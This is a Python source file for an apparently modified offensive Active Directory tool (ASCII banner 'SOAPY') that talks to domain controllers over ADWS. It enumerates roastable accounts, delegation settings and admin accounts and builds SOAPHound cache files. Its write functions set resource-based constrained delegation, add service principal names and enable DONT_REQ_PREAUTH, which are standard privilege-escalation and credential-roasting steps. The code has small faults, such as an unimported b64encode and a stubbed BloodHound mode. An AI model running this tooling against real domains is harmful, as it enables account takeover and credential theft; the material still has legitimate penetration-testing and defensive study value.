import argparse
import logging
import sys
import json
import io
import unicodedata
from base64 import b64decode
from uuid import UUID

# Importations spécifiques à impacket et ADWS
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.ldap.ldaptypes import (
    ACCESS_ALLOWED_ACE,
    ACCESS_MASK,
    ACE,
    ACL,
    LDAP_SID,
    SR_SECURITY_DESCRIPTOR,
)
from src.adws import ADWSConnect, NTLMAuth
from src.soap_templates import NAMESPACES

# --- Existing Utility Functions ---

def _create_empty_sd():
    """Creates an empty security descriptor for update operations."""
    sd = SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772
    sd["OwnerSid"] = LDAP_SID()
    sd["OwnerSid"].fromCanonical("S-1-5-32-544") # BUILTIN\Administrators
    sd["GroupSid"] = b""
    sd["Sacl"] = b""
    acl = ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    acl.aces = []
    sd["Dacl"] = acl
    return sd

def _create_allow_ace(sid: LDAP_SID):
    """Creates an ACCESS_ALLOWED ACE for adding to a security descriptor."""
    nace = ACE()
    nace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE
    nace["AceFlags"] = 0x00
    acedata = ACCESS_ALLOWED_ACE()
    acedata["Mask"] = ACCESS_MASK()
    acedata["Mask"]["Mask"] = 983551  # Full control
    acedata["Sid"] = sid.getData()
    nace["Ace"] = acedata
    return nace

def getAccountDN(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
):
    """
    Gets an LDAP object's distinguishedName attribute.
    """
    get_account_query = f"(samAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "distinguishedname",
    ]

    pull_et = pull_client.pull(query=get_account_query, attributes=attributes)

    dn = None
    # We expect this to be a user, but it could be other types too
    for item in pull_et.findall(".//addata:*", namespaces=NAMESPACES):
        distinguishedName_elem = item.find(
            ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
        )
        if distinguishedName_elem is not None:
            dn = distinguishedName_elem.text
            break # Found the DN, no need to continue

    if dn is None:
        logging.critical(f"Unable to find distinguishedName for target: {target}")
        sys.exit(1)
    return dn


def set_spn(
    target: str,
    value: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """
    Sets a value in the servicePrincipalName attribute. Appends by default.
    """
    dn = getAccountDN(target=target, username=username, ip=ip, domain=domain, auth=auth)

    put_client = ADWSConnect.put_client(ip, domain, username, auth)

    put_client.put(
        object_ref=dn,
        operation="add" if not remove else "delete",
        attribute="addata:servicePrincipalName",
        data_type="string",
        value=value,
    )

    print(
        f"[+] servicePrincipalName {value} {'removed' if remove else 'written'} successfully on {target}!"
    )

def set_asrep(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """
    Sets or removes the DONT_REQ_PREAUTH (0x400000) flag on the target account's
    userAccountControl attribute.
    """
    get_accounts_queries = f"(sAMAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "userAccountControl",
        "distinguishedName",
    ]

    uac_val = None
    dn = None

    pull_et = pull_client.pull(query=get_accounts_queries, attributes=attributes)
    for item in pull_et.findall(".//addata:*", namespaces=NAMESPACES): # Look for any AD object type
        uac_elem = item.find(
            ".//addata:userAccountControl/ad:value",
            namespaces=NAMESPACES,
        )
        distinguishedName_elem = item.find(
            ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
        )
        if uac_elem is not None:
            uac_val = int(uac_elem.text)
        if distinguishedName_elem is not None:
            dn = distinguishedName_elem.text
        if uac_val is not None and dn is not None:
            break # Found both, can exit loop

    if dn is None or uac_val is None:
        logging.critical(f"Unable to find userAccountControl or distinguishedName for target: {target}")
        sys.exit(1)

    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    if not remove:
        newUac = uac_val | 0x400000
    else:
        newUac = uac_val & ~0x400000

    put_client.put(
        object_ref=dn,
        operation="replace",
        attribute="addata:userAccountControl",
        data_type="string",
        value=newUac,
    )

    print(
        f"[+] DONT_REQ_PREAUTH {'removed' if remove else 'written'} successfully!"
    )

def set_rbcd(
    target: str,
    account: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
    remove: bool = False,
):
    """
    Writes or removes RBCD (Resource-Based Constrained Delegation) ACEs.
    Safe, appends to the attribute rather than replacing.
    """
    get_accounts_queries = f"(|(sAMAccountName={target})(sAMAccountName={account}))"

    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "samaccountname",
        "objectsid",
        "distinguishedname",
        "msds-allowedtoactonbehalfofotheridentity",
    ]

    pull_et = pull_client.pull(query=get_accounts_queries, attributes=attributes)

    target_sd: SR_SECURITY_DESCRIPTOR = _create_empty_sd()
    target_dn: str = ""
    account_sid: LDAP_SID | None = None

    for item in pull_et.findall(".//addata:computer", namespaces=NAMESPACES):
        sam_name_elem = item.find(
            ".//addata:sAMAccountName/ad:value", namespaces=NAMESPACES
        )
        sd_elem = item.find(
            ".//addata:msDS-AllowedToActOnBehalfOfOtherIdentity/ad:value",
            namespaces=NAMESPACES,
        )
        sid_elem = item.find(".//addata:objectSid/ad:value", namespaces=NAMESPACES)
        distinguishedName_elem = item.find(
            ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
        )

        sam_name = sam_name_elem.text if sam_name_elem is not None else ""
        sid_b64 = sid_elem.text if sid_elem is not None else ""
        sd_b64 = sd_elem.text if sd_elem is not None else ""
        dn = distinguishedName_elem.text if distinguishedName_elem is not None else ""

        if sam_name and sid_b64 and sam_name.casefold() == account.casefold():
            try:
                account_sid = LDAP_SID(data=b64decode(sid_b64))
            except Exception as e:
                logging.error(f"Error decoding SID for account {account}: {e}")
                account_sid = None # Ensure it's None if decoding fails

        if dn and sam_name and sam_name.casefold() == target.casefold():
            target_dn = dn
            if sd_b64:
                try:
                    target_sd = SR_SECURITY_DESCRIPTOR(data=b64decode(sd_b64))
                except Exception as e:
                    logging.error(f"Error decoding SD for target {target}: {e}")
                    target_sd = _create_empty_sd() # Fallback to empty SD if decoding fails

    if not account_sid:
        logging.critical(
            f"Unable to find {target} or {account}, or decode their SID."
        )
        sys.exit(1)

    # Collect a clean list. Remove the account sid if it's present.
    target_sd["Dacl"].aces = [
        ace
        for ace in target_sd["Dacl"].aces
        if ace["Ace"]["Sid"].formatCanonical() != account_sid.formatCanonical()
    ]
    if not remove:
        target_sd["Dacl"].aces.append(_create_allow_ace(account_sid))

    put_client = ADWSConnect.put_client(ip, domain, username, auth)

    # Encode the security descriptor back to base64 for writing
    encoded_sd = b64encode(target_sd.getData()).decode("utf-8")

    put_client.put(
        object_ref=target_dn,
        operation="replace",
        attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
        data_type="base64Binary",
        value=encoded_sd,
    )

    # If we are removing and the list of aces is empty, just delete the attribute
    if remove and len(target_sd["Dacl"].aces) == 0:
        put_client.put(
            object_ref=target_dn,
            operation="delete",
            attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
            data_type="base64Binary", # Data type must match original for delete op
            value=encoded_sd, # Value must also be provided for delete in ADWS
        )

    print(
        f"[+] msDS-AllowedToActOnBehalfOfIdentity {'removed' if remove else 'written'} successfully!"
    )
    print(f"[+] {account} {'can not' if remove else 'can'} delegate to {target}")

# --- SOAPHound Cache Mappings and Logic ---

# Mapping objectClass to SOAPHound Type IDs (based on your observed cache)
SOAPHOUND_OBJECT_CLASS_MAPPING = {
    "user": 0,
    "computer": 1,
    "group": 2,
    "groupPolicyContainer": 3,  # Confirmed: GPOs
    "domainDNS": 4,             # Confirmed: Root Domain
    "organizationalUnit": 5,    # Confirmed: OUs
    "container": 6,             # Confirmed: Generic containers (CN=Users, CN=Computers, etc.)
    "base": 7,
    "CA": 8,
    "foreignSecurityPrincipal": 2

}

# Priority order for determining SOAPHound type if an object has multiple objectClass values.
# The first 'objectClass' found in this list that has a mapping in SOAPHOUND_OBJECT_CLASS_MAPPING.
SOAPHOUND_OBJECT_CLASS_PRIORITY = [
    "computer",  # Moved to higher priority to correctly classify computer accounts
    "user",
    "group",
    "foreignSecurityPrincipal",
    "groupPolicyContainer",
    "organizationalUnit",
    "domainDNS",
    "container",
    "base",
    "CA"
]


def get_soaphound_type_id(dn, object_classes, object_sid, domain_root_dn):
    """
    Determines the SOAPHound type ID for an AD object.
    """
    # Special case for the Domain object itself (search base)
    if dn.lower() == domain_root_dn.lower():
        return 4  # Confirmed: Domain object is ID 4

    # Special case for the Builtin container (SID S-1-5-32)
    if object_sid == "S-1-5-32": # Assuming this is the canonical SID representation
        return 7  # Confirmed: Builtin container is ID 7
     
    if object_sid == "S-1-5-17": # Service Logon Account (c'est un groupe)
        return 2
    # Apply objectClass mapping based on priority
    for oc_priority in SOAPHOUND_OBJECT_CLASS_PRIORITY:
        if oc_priority in object_classes:
            type_id = SOAPHOUND_OBJECT_CLASS_MAPPING.get(oc_priority)
            if type_id is not None:
                return type_id

    # Fallback for objects that might not have a direct objectClass mapping
    # but can be inferred as OUs or generic containers based on DN structure.
    if dn.startswith("OU="):
        return 5  # Assume OU if DN starts with OU
    elif dn.startswith("CN="):
        return 6  # Assume generic container if DN starts with CN

    return 6  # Default fallback to generic container ID if no specific type is determined


def run_cli():
    print("""
███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝
╚════██║██║   ██║██╔══██║██╔═══╝   ╚██╔╝
███████║╚██████╔╝██║  ██║██║        ██║
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝        ╚═╝ 1.1
    """)

    parser = argparse.ArgumentParser(
        add_help=True,
        description="Enumerate and write LDAP objects over ADWS using the SOAP protocol",
    )
    parser.add_argument(
        "connection",
        action="store",
        help="domain/username[:password]@<targetName or address>",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Turn DEBUG output ON"
    )
    parser.add_argument(
        "--ts",
        action="store_true",
        help="Adds timestamp to every logging output."
    )
    parser.add_argument(
        "--hash",
        action="store",
        metavar="nthash",
        help="Use an NT hash for authentication",
    )

    enum = parser.add_argument_group('Enumeration')
    enum.add_argument(
        "--users",
        action="store_true",
        help="Enumerate user objects"
    )
    enum.add_argument(
        "--computers",
        action="store_true",
        help="Enumerate computer objects"
    )

    enum.add_argument(
        "--cache",
        action="store_true",
        help="Create SOAPHound compatible cache files (IdToTypeCache.json, ValueToIdCache.json)"
    )

    enum.add_argument(
        "--bloodhound",
        action="store_true",
        help="Collect AD objects for Bloodhound"
    )

    enum.add_argument(
        "--groups",
        action="store_true",
        help="Enumerate group objects"
    )
    enum.add_argument(
        "--constrained",
        action="store_true",
        help="Enumerate objects with the msDS-AllowedToDelegateTo attribute set",
    )
    enum.add_argument(
        "--unconstrained",
        action="store_true",
        help="Enumerate objects with the TRUSTED_FOR_DELEGATION flag set",
    )
    enum.add_argument(
        "--spns",
        action="store_true",
        help="Enumerate accounts with the servicePrincipalName attribute set"
    )
    enum.add_argument(
        "--asreproastable",
        action="store_true",
        help="Enumerate accounts with the DONT_REQ_PREAUTH flag set"
    )
    enum.add_argument(
        "--admins",
        action="store_true",
        help="Enumerate high privilege accounts"
    )
    enum.add_argument(
        "--rbcds",
        action="store_true",
        help="Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity set"
    )
    enum.add_argument(
        "-q",
        "--query",
        action="store",
        metavar="query",
        help="Raw query to execute on the target",
    )
    enum.add_argument(
        "--filter",
        action="store",
        metavar="attr,attr,...",
        help="Attributes to select from the objects returned, in a comma seperated list",
    )

    writing = parser.add_argument_group('Writing')
    writing.add_argument(
        "--rbcd",
        action="store",
        metavar="source",
        help="Operation to write or remove RBCD. Also used to pass in the source computer account used for the attack.",
    )
    writing.add_argument(
        "--spn",
        action="store",
        metavar="value",
        help='Operation to write the servicePrincipalName attribute value, writes by default unless "--remove" is specified',
    )
    writing.add_argument(
        "--asrep",
        action="store_true",
        help="Operation to write the DONT_REQ_PREAUTH (0x400000) userAccountControl flag on a target object"
    )
    writing.add_argument(
        "--account",
        action="store",
        metavar="account",
        help="Account to perform an operation on",
    )
    writing.add_argument(
        "--remove",
        action="store_true",
        help="Operation to remove an attribute value based off an operation",
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.connection)

    if domain is None:
        domain = ""

    # If no supplied auth information, ask for a password interactively
    if not password and username and not options.hash:
        from getpass import getpass
        password = getpass("Password:")

    queries: dict[str, str] = {
        "users": "(&(objectClass=user)(objectCategory=person))",
        "computers": "(objectClass=computer)",
        "constrained": "(msds-allowedtodelegateto=*)",
        "unconstrained": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
        "spns": "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "asreproastable":"(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "admins": "(&(objectClass=user)(adminCount=1))",
        "groups": "(objectCategory=group)",
        "rbcds": "(msds-allowedtoactonbehalfofotheridentity=*)",
        # For cache and bloodhound, we generally want to pull all objects
        "cache": "(objectClass=*)",
        "bloodhound": "(objectClass=*)",
    }

    ldap_query = []
    if options.query:
        ldap_query.append(options.query)
    for flag, this_query in queries.items():
            # If an enumeration flag is set, and it's not handled by --cache/--bloodhound/--query already
            if getattr(options, flag) and flag not in ["cache", "bloodhound", "query"]:
                ldap_query.append(this_query)

    if not domain:
        logging.critical('"domain" must be specified')
        sys.exit(1)

    if not username:
        logging.critical('"username" must be specified')
        sys.exit(1)

    auth = NTLMAuth(password=password, hashes=options.hash)

    # --- Write Operations ---
    if options.rbcd is not None:
        if not options.account:
            logging.critical(
                '"--rbcd" must be used with "--account"'
            )
            sys.exit(1)
        set_rbcd(
            ip=remoteName,
            domain=domain,
            target=options.account,
            account=options.rbcd,
            username=username,
            auth=auth,
            remove=options.remove,
        )
    elif options.spn is not None:
        if not options.account:
            logging.critical(
                'Please specify an account with "--account"'
            )
            sys.exit(1)
        set_spn(
            ip=remoteName,
            domain=domain,
            target=options.account,
            value=options.spn,
            username=username,
            auth=auth,
            remove=options.remove
        )
    elif options.asrep:
        if not options.account:
            logging.critical(
                'Please specify an account with "--account"'
            )
            sys.exit(1)
        set_asrep(
            ip=remoteName,
            domain=domain,
            target=options.account,
            username=username,
            auth=auth,
            remove=options.remove
        )
    # --- Enumeration / Cache Generation Operations ---
    else:
        client = ADWSConnect.pull_client(
            ip=remoteName,
            domain=domain,
            username=username,
            auth=auth,
        )

        attributes_to_fetch = []
        if options.cache:
            # We need these attributes for SOAPHound cache generation
            attributes_to_fetch = ["objectSid", "objectGUID", "distinguishedName"]
            # Reconstruct domain root DN for ID 4 mapping
            domain_root_dn = f"DC={domain.replace('.', ',DC=')}"
        elif options.bloodhound:
            # Attributes typically needed for Bloodhound ingestion
            attributes_to_fetch = [
                    "name", "sAMAccountName", "cn", "dNSHostName", "objectSid", "objectGUID",
                    "primaryGroupID", "distinguishedName", "lastLogonTimestamp", "pwdLastSet",
                    "servicePrincipalName", "description", "operatingSystem", "sIDHistory",
                    "nTSecurityDescriptor", "userAccountControl", "whenCreated", "lastLogon",
                    "displayName", "title", "homeDirectory", "userPassword", "unixUserPassword",
                    "scriptPath", "adminCount", "member", "msDS-Behavior-Version",
                    "msDS-AllowedToDelegateTo", "gPCFileSysPath", "gPLink", "gPOptions", "objectClass"
                ]
        elif options.filter:
            # If a custom filter is provided, use those attributes
            attributes_to_fetch = [x.strip() for x in options.filter.split(",")]
        else:
            # Default attributes for general enumeration
            attributes_to_fetch = ["samaccountname", "distinguishedName", "objectsid", "objectClass", "objectGUID"]


        # If no specific query is provided, but cache or bloodhound is requested, use (objectClass=*)
        if not ldap_query:
            if options.cache or options.bloodhound:
                ldap_query.append("(objectClass=*)")
            else:
                logging.critical("No query specified. Use --query or an enumeration flag (e.g., --users, --cache).")
                sys.exit(1)

        # Initialize caches for SOAPHound
        id_to_type_cache = {}
        value_to_id_cache = {}

        all_pulled_items = []
        for current_query in ldap_query:
            if not current_query:
                continue
            pull_et = client.pull(current_query, attributes_to_fetch)

            # Iterate through different possible object types in the XML response
            for item in pull_et.findall(".//addata:*", namespaces=NAMESPACES):
                obj_data = {}
                obj_data['distinguishedName'] = item.findtext(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
                obj_data['objectSid'] = item.findtext(".//addata:objectSid/ad:value", namespaces=NAMESPACES)
                obj_data['objectGUID'] = item.findtext(".//addata:objectGUID/ad:value", namespaces=NAMESPACES)

                obj_data['objectClass'] = []
                for oc_elem in item.findall(".//addata:objectClass/ad:value", namespaces=NAMESPACES):
                    if oc_elem.text:
                        obj_data['objectClass'].append(oc_elem.text)

                # Add other requested attributes if they were part of attributes_to_fetch
                for attr_name in attributes_to_fetch:
                    # Skip attributes already handled above or objectClass as it's a list
                    if attr_name not in obj_data and attr_name != "objectClass":
                        attr_elem = item.find(f".//addata:{attr_name}/ad:value", namespaces=NAMESPACES)
                        if attr_elem is not None and attr_elem.text is not None:
                            obj_data[attr_name] = attr_elem.text

                # Only process if essential attributes are present
                if obj_data['distinguishedName'] and (obj_data['objectSid'] or obj_data['objectGUID']):
                    all_pulled_items.append(obj_data)
                else:
                    logging.debug(f"Skipping incomplete object: {obj_data.get('distinguishedName')}")


        if options.cache:
            for obj in all_pulled_items:
                dn = obj['distinguishedName']
                raw_sid_b64 = obj['objectSid']
                raw_guid_b64 = obj['objectGUID']
                object_classes = obj['objectClass']

                sid_canonical = None
                if raw_sid_b64:
                    try:
                        # Decode base64 SID to bytes, then format to canonical string
                        sid_obj = LDAP_SID(data=b64decode(raw_sid_b64))
                        sid_canonical = sid_obj.formatCanonical()
                    except Exception as e:
                        logging.debug(f"Could not decode SID for {dn}: {e}. Raw: {raw_sid_b64}")
                        sid_canonical = None


                guid_str = None
                if raw_guid_b64:
                    try:
                        # Decode base64 GUID to little-endian bytes, then convert to standard UUID string
                        guid_bytes_le = b64decode(raw_guid_b64)
                        guid_str = str(UUID(bytes_le=guid_bytes_le))
                    except Exception as e:
                        logging.debug(f"Could not decode GUID for {dn}: {e}. Raw: {raw_guid_b64}")
                        guid_str = None

                # Determine the primary identifier for IdToTypeCache and ValueToIdCache
                # Prioritize SID over GUID.
                primary_identifier = None
                if sid_canonical:
                    primary_identifier = sid_canonical
                elif guid_str: # Only use GUID if SID is not available
                    primary_identifier = guid_str
                else:
                    logging.warning(f"Object {dn} has neither SID nor GUID. Skipping for cache.")
                    continue

                # Populate IdToTypeCache: maps the primary identifier to its SOAPHound type
                id_to_type_cache[primary_identifier] = get_soaphound_type_id(dn, object_classes, sid_canonical, domain_root_dn)

                # Populate ValueToIdCache: maps displayable values (DN) to the primary identifier
                value_to_id_cache[dn] = primary_identifier

                # The following block for adding GUID:SID mappings was REMOVED as requested.
                # If you need GUIDs to resolve to SIDs in ValueToIdCache, you would re-add it.


            # Normalize keys for ValueToIdCache for consistency
            normalized_valuetoid = {}
            for key, value in value_to_id_cache.items():
                normalized_key = unicodedata.normalize('NFKC', key)
                normalized_valuetoid[normalized_key] = value

            value_to_id_cache = normalized_valuetoid

            # Save caches to JSON files
            output_dir = "." # You can change this to a specific output path
            try:
                with open(f"{output_dir}/IdToTypeCache.json", "w", encoding="utf-8") as f:
                    json.dump(id_to_type_cache, f, indent=2, ensure_ascii=False)
                print(f"[*] IdToTypeCache.json generated at {output_dir}/IdToTypeCache.json")

                with open(f"{output_dir}/ValueToIdCache.json", "w", encoding="utf-8") as f:
                    json.dump(value_to_id_cache, f, indent=2, ensure_ascii=False)
                print(f"[*] ValueToIdCache.json generated at {output_dir}/ValueToIdCache.json")
            except IOError as e:
                logging.critical(f"Error writing cache files: {e}")
                sys.exit(1)

        elif options.bloodhound:
            # Placeholder for Bloodhound JSON generation
            print("[*] Bloodhound collection would be processed here.")
            logging.info("Bloodhound data collection not fully implemented in this script.")
        else:
            # Original printing logic for general enumeration to stdout
            if not all_pulled_items:
                print("No results found for the specified query/filters.")
            for obj in all_pulled_items:
                for attr, val in obj.items():
                    print(f"{attr}: {val}")
                print("-" * 20) # Separator for readability

if __name__ == "__main__":
    run_cli()